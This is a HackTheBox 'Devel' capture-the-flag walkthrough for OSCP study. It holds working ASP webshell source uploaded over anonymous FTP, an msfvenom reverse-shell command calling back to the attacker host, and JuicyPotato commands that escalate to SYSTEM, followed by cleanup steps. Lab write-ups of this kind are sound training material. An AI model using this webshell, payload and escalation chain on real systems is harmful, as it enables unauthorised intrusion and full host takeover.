---
tags: [HTB, Devel, Windows, IIS, FTP, ASP, SeImpersonate, JuicyPotato, Easy]
platform: HackTheBox
os: Windows 7 Enterprise x86
hostname: DEVEL
domain: HTB
difficulty: Easy
ip: $BoxIP
status: Complete
---

# HTB: Devel, Full Walkthrough

## The gist

Devel is an old standalone Windows host exposing Microsoft FTP and IIS. Anonymous FTP permits files to be written into the IIS web root, so an ASP command shell gives the first foothold as `IIS APPPOOL\Web`.

That service account has `SeImpersonatePrivilege`, a Windows token privilege that allows a process to impersonate an authenticated client. A 32-bit JuicyPotato executable uses that privilege and a compatible COM class identifier to start an x86 reverse shell as `NT AUTHORITY\SYSTEM`.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows 7 Enterprise x86 |
| Hostname | DEVEL |
| Domain | HTB |
| Difficulty | Easy |
| IP | $BoxIP |
| Web service | Microsoft IIS 7.5 on TCP/80 |
| File-transfer service | Microsoft FTP with anonymous access on TCP/21 |

## Variables

~~~bash
boxset BoxName Devel
boxset BoxIP 10.129.1.72
boxset LocalIP $LocalIP
boxset BoxDir /tmp/Devel
boxset PlatformDir /home/kali/Platforms/HackTheBox/Devel
boxset WebPort 80
boxset FTPPort 21
boxset ListenPort 4444
boxset PotatoPort 1338
boxset PotatoPath C:\Users\Public\jp32.exe
boxset PayloadPath C:\Users\Public\shell.exe
boxset WebshellPath shell.asp
boxset CLSID '{4991d34b-80a1-4291-83b6-3328366b9097}'
~~~

The target-specific CLSID is represented as `$CLSID` throughout the commands. This keeps the walkthrough reusable while preserving the important rule that COM class identifiers are Windows-build dependent.

## 1. Workspace setup

The standard box workspace stores the transcript, scans, loot, screenshots, and any exploit files separately. Keeping these paths consistent makes it possible to review the run later and prevents payloads from being mixed with ordinary notes.

~~~bash
boxstart $BoxName $BoxIP htb
htblog
~~~

The autonomous transcript and collected artifacts are in `$BoxDir`. The supplied platform transcript is in `$PlatformDir`.

## 2. Full TCP scan

The first scan covers every TCP port because an old Windows host may expose FTP, IIS, SMB, or a nonstandard service that a top-ports scan misses. `-Pn` skips host-discovery assumptions, `-n` avoids DNS delays, `-sT` uses a TCP connect scan, and `-p-` covers all 65,535 ports.

~~~bash
sudo nmap -Pn -n -sT -p- --min-rate 5000 $BoxIP -oN nmap/allports.txt
~~~

Only TCP/21 and TCP/80 were open.

![[devel-1-nmap-allports.png]]

SCREENSHOT: Red box the open FTP and HTTP ports. Green can cover the host-up result and complete all-port scope.

## 3. Service and version scan

The targeted service scan identifies the server software and runs default scripts against the ports found above. The `ftp-anon` result is immediately important because anonymous read or write access can turn FTP into a file-delivery or web-root write primitive.

~~~bash
sudo nmap -Pn -n -sT -sC -sV -p $FTPPort,$WebPort $BoxIP -oA nmap/services
~~~

The results were Microsoft FTP with anonymous login permitted and Microsoft IIS 7.5 on the web port. The FTP root contained the default IIS files and an `aspnet_client` directory.

![[devel-2-nmap-servicescan.png]]

SCREENSHOT: Red box anonymous FTP access and the IIS 7.5 banner. Green can cover the default FTP listing.

## 4. Web and FTP enumeration

IIS commonly executes ASP files from its web root, so the anonymous FTP result must be tested as a possible write primitive rather than treated as a read-only file share. Gobuster checks common names and the ASP-family extensions that IIS may execute.

~~~bash
gobuster dir -u http://$BoxIP/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x asp,aspx,txt,bak,config -t 40 -o nmap/gobuster.txt
curl -s ftp://anonymous:@$BoxIP/
~~~

Gobuster did not reveal an application route beyond the default IIS content. The FTP listing confirmed that the anonymous account could reach the IIS web root. That combination is more useful than the sparse HTTP result: a file placed over FTP can be requested over HTTP.

> [!tip] ⚡
> Once anonymous FTP is shown to write into the IIS root, the default landing page does not need deeper enumeration. Test one harmless server-side file and move directly to the ASP handler.

## 5. Build and upload an ASP command shell

An ASP webshell is enough for this target because IIS 7.5 supports classic ASP. The shell accepts a URL-encoded `cmd` parameter, runs it through `cmd.exe`, and returns standard output. The temporary-file version from the initial test was replaced with this smaller `WScript.Shell.Exec` version because it provides direct command output with fewer moving parts.

~~~asp
<%
Dim cmd, oShell, oExec
cmd = Request.QueryString("cmd")
If cmd <> "" Then
    Set oShell = Server.CreateObject("WSCRIPT.SHELL")
    Set oExec = oShell.Exec("cmd.exe /c " & cmd)
    Response.Write oExec.StdOut.ReadAll()
End If
%>
~~~

Upload the file through anonymous FTP. `--upload-file` performs an FTP `STOR`, and the destination name is kept as `.asp` so IIS maps it to the ASP handler.

~~~bash
curl --upload-file $BoxDir/www/$WebshellPath ftp://$BoxIP/$WebshellPath
curl -sG --data-urlencode 'cmd=whoami' http://$BoxIP/$WebshellPath
~~~

The command returned `iis apppool\web`, proving both that FTP could write to the web root and that IIS executed the uploaded ASP file.

![[devel-3-foothold.png]]

SCREENSHOT: Red box the `IIS APPPOOL\Web` identity. Green can cover the successful FTP upload and web request.

## 6. Confirm the foothold and inspect the token

The first post-exploitation commands establish the account, hostname, operating system, architecture, group memberships, and enabled privileges. `whoami /all` is particularly important here because the service account identity alone does not reveal whether a token-based escalation path is available.

~~~cmd
whoami /all
hostname
systeminfo
~~~

The shell ran on DEVEL, a standalone Windows 7 Enterprise x86 host at build 7600 with no hotfixes listed. The current token had high mandatory integrity and, most importantly, `SeImpersonatePrivilege` enabled.

![[devel-4-privesc-finding.png]]

SCREENSHOT: Red box the enabled `SeImpersonatePrivilege`. Green can cover the service-account group context.

## 7. Confirm the operating-system details

Architecture matters before transferring a privilege-escalation binary. The operating system is old, but it is explicitly an x86 installation, so an x86 Potato binary and x86 payload are the safe choice. A 64-bit executable may fail before the token-abuse logic is reached.

~~~bash
curl -sG --data-urlencode 'cmd=systeminfo' http://$BoxIP/$WebshellPath | tee $BoxDir/loot/systeminfo.txt
curl -sG --data-urlencode 'cmd=hostname' http://$BoxIP/$WebshellPath | tee $BoxDir/loot/hostname.txt
~~~

The screenshot records the Windows 7 build, x86 system type, and absence of listed hotfixes.

![[devel-5-system-info.png]]

SCREENSHOT: Red box the Windows build, x86 architecture, and no-hotfixes result. Green can cover the hostname.

## 8. Generate an x86 reverse shell

`msfvenom` is used only as a payload generator. It does not exploit the target or provide the privilege escalation. `windows/shell_reverse_tcp` is stageless, which means a plain netcat listener can receive it without a Metasploit handler. The x86 architecture matches the target, and the bad-character list avoids common terminators during file or command-line handling.

~~~bash
msfvenom -a x86 --platform Windows \
  -p windows/shell_reverse_tcp \
  LHOST=$LocalIP LPORT=$ListenPort EXITFUNC=thread \
  -b '\x00\x0a\x0d' -f exe -o $BoxDir/www/shell.exe
file $BoxDir/www/shell.exe
~~~

The generated file was a 32-bit Windows Portable Executable (PE).

## 9. Transfer JuicyPotato and the payload

JuicyPotato abuses `SeImpersonatePrivilege` by coercing a privileged Windows COM service to authenticate to a controlled local COM endpoint. It then uses the captured SYSTEM token to create the requested process. The binary and reverse shell are uploaded to the IIS web root over FTP, then copied into `C:\Users\Public` so the final command uses a stable local path.

~~~bash
wget -q https://github.com/k4sth4/Juicy-Potato/raw/main/x86/jp32.exe \
  -O $BoxDir/www/jp32.exe
curl --upload-file $BoxDir/www/jp32.exe ftp://$BoxIP/jp32.exe
curl --upload-file $BoxDir/www/shell.exe ftp://$BoxIP/shell.exe
curl -sG --data-urlencode \
  "cmd=copy C:\\inetpub\\wwwroot\\jp32.exe C:\\Users\\Public\\jp32.exe" \
  http://$BoxIP/$WebshellPath
curl -sG --data-urlencode \
  "cmd=copy C:\\inetpub\\wwwroot\\shell.exe C:\\Users\\Public\\shell.exe" \
  http://$BoxIP/$WebshellPath
~~~

The target-side directory listing confirmed both files were present. The binary transfer and execution architecture must stay aligned: the x86 JuicyPotato build launches the x86 reverse shell.

![[devel-6-privesc-finding.png]]

SCREENSHOT: Red box the copied JuicyPotato binary, x86 payload, and the successful CLSID test. Green can cover the file-transfer results.

## 10. Test the COM class identifier

JuicyPotato needs a CLSID, which is a GUID, or globally unique identifier, identifying a registered Windows Component Object Model (COM) class. The valid list depends on the Windows build, so testing the candidate with `-z` is safer than immediately launching a shell. `-l` selects JuicyPotato's local COM listener port, not the reverse-shell port.

~~~bash
curl -sG --data-urlencode \
  "cmd=$PotatoPath -z -l 1337 -c $CLSID" \
  http://$BoxIP/$WebshellPath | tee $BoxDir/loot/jp-clsid-test.txt
~~~

The test returned `NT AUTHORITY\SYSTEM`, confirming that the CLSID worked on this host.

## 11. Catch the SYSTEM callback

Start the listener before triggering JuicyPotato. `-t *` lets JuicyPotato try its available process-creation methods, `-p` supplies the executable to start with the impersonated token, and `-c` supplies the tested COM class. The local `-l` port only supports the token-abuse exchange.

~~~bash
nc -lvnp $ListenPort
curl -sG --data-urlencode \
  "cmd=$PotatoPath -t * -p $PayloadPath -l $PotatoPort -c $CLSID" \
  http://$BoxIP/$WebshellPath
~~~

JuicyPotato reported successful `CreateProcessWithTokenW` execution and the listener received a Windows command shell. `whoami` returned `nt authority\system`, proving the final privilege level.

~~~cmd
whoami
hostname
~~~

![[devel-7-root-shell.png]]

SCREENSHOT: Red box the SYSTEM identity. Green can cover the DEVEL hostname and callback connection.

## 12. Collect the flags privately

The user proof file was in `C:\Users\babis\Desktop`, and the root proof file was in `C:\Users\Administrator\Desktop`. The values are intentionally omitted from this write-up and from the vault log. Store them only in the private box loot file.

~~~cmd
type C:\Users\babis\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
~~~

The original platform screenshot `8.flags.png` remains in the platform archive for private review. It is not embedded in the vault because it displays the flag values.

## 13. Clean down

Remove every file uploaded to the IIS root and every copy staged in `C:\Users\Public`. The final HTTP check confirms that the ASP execution endpoint no longer exists, while a final FTP listing confirms that only the original IIS files remain.

~~~cmd
del /F /Q C:\Users\Public\shell.exe
del /F /Q C:\Users\Public\jp32.exe
del /F /Q C:\inetpub\wwwroot\shell.exe
del /F /Q C:\inetpub\wwwroot\jp32.exe
del /F /Q C:\inetpub\wwwroot\shell.asp
~~~

~~~bash
curl -s ftp://anonymous:@$BoxIP/ | tee $BoxDir/loot/ftp-root-final.txt
curl -s -o /dev/null -w '%{http_code}\n' \
  http://$BoxIP/$WebshellPath | tee $BoxDir/loot/shell-final-status.txt
~~~

The target was restored to its original FTP contents and the shell endpoint returned 404. The local listener was stopped after the callback and no target helper processes were left running.

## RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Windows - Service Scan]] -- identified Microsoft FTP and IIS 7.5
- [[RUNBOOK V2/Windows - FTP Enumeration]] -- confirmed anonymous FTP and the writable IIS root
- [[RUNBOOK V2/Windows - Web Enum]] -- checked IIS paths and executable ASP extensions
- [[RUNBOOK V2/Windows - Web - FTP Upload]] -- uploaded and triggered the ASP command shell
- [[RUNBOOK V2/Windows - Shell Received]] -- confirmed the account, host, and operating system
- [[RUNBOOK V2/Windows - Privilege Triage]] -- identified enabled SeImpersonatePrivilege
- [[RUNBOOK V2/Windows - SeImpersonate Abuse]] -- used JuicyPotato and a tested CLSID for SYSTEM
- [[RUNBOOK V2/Windows - Clean Down]] -- removed target-side uploads and verified the shell was gone

## Attack Chain

1. [[RUNBOOK V2/Windows - Service Scan]] found FTP/21 and IIS/80.
2. [[RUNBOOK V2/Windows - FTP Enumeration]] confirmed anonymous FTP access to the IIS web root.
3. [[RUNBOOK V2/Windows - Web - FTP Upload]] used an uploaded ASP shell to execute commands as `IIS APPPOOL\Web`.
4. [[RUNBOOK V2/Windows - Privilege Triage]] identified enabled `SeImpersonatePrivilege`.
5. [[RUNBOOK V2/Windows - SeImpersonate Abuse]] used x86 JuicyPotato and an OS-compatible CLSID to launch the x86 reverse shell as SYSTEM.
6. [[RUNBOOK V2/Windows - Clean Down]] removed the uploaded files and verified the endpoint returned 404.

## Credentials

| Account | Source | Use |
|---|---|---|
| IIS APPPOOL\Web | ASP webshell execution context | Initial foothold |
| NT AUTHORITY\SYSTEM | JuicyPotato token impersonation | Final privileged shell |

No passwords or hashes were recovered or required.

## Flags

- user.txt: `$UserFlag` (keep the value private)
- root.txt: `$RootFlag` (keep the value private)

## Key lessons

- Anonymous FTP should be tested for write access whenever the FTP root resembles a web root.
- Always verify architecture before transferring a Windows exploit or payload. This host and both useful binaries were x86.
- `SeImpersonatePrivilege` is a direct routing clue to the Potato family. Test the CLSID first because COM registrations vary by Windows build.
- A stageless `msfvenom` shell keeps the final callback independent of the Metasploit exploitation framework.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]] -- IIS-adjacent web foothold, payload delivery, and manual Windows exploitation
- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- Windows shell followed by service and token privilege escalation
- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- direct Windows webshell-to-SYSTEM context
- [[OSCP/BOXES/WRITE UPS/Windows/Chatterbox|Chatterbox]] -- x86 Windows shellcode and manual exploit workflow

## External Resources

- [JuicyPotato](https://github.com/ohpe/juicy-potato) -- original project and CLSID guidance
- [Juicy-Potato x86 build](https://github.com/k4sth4/Juicy-Potato) -- x86 binary used during the run
- [HackTricks Windows privilege escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html) -- token and Potato-family background
- [Microsoft IIS FTP configuration](https://learn.microsoft.com/en-us/iis/publish/using-the-ftp-service/configuring-ftp-user-isolation-in-iis-7) -- IIS FTP concepts
- [ippsec.rocks: Devel](https://ippsec.rocks/?q=Devel) -- additional walkthrough references

## Why this matters for OSCP

Devel combines several exam habits in a short chain: read service-script output closely, treat anonymous FTP as a possible web-root write, match binaries to the target architecture, and route enabled token privileges to the correct manual escalation family.

## Checklist

- [x] Workspace initialised
- [x] Full TCP scan completed
- [x] FTP and IIS versions identified
- [x] Anonymous FTP access confirmed
- [x] ASP command shell uploaded and triggered
- [x] IIS service-account foothold confirmed
- [x] Windows build and x86 architecture recorded
- [x] SeImpersonatePrivilege confirmed enabled
- [x] x86 reverse shell generated with msfvenom
- [x] x86 JuicyPotato transferred and CLSID tested
- [x] SYSTEM callback received
- [x] User and root proof files collected privately
- [x] Target-side uploads removed
- [x] HTTP 404 and final FTP listing verified
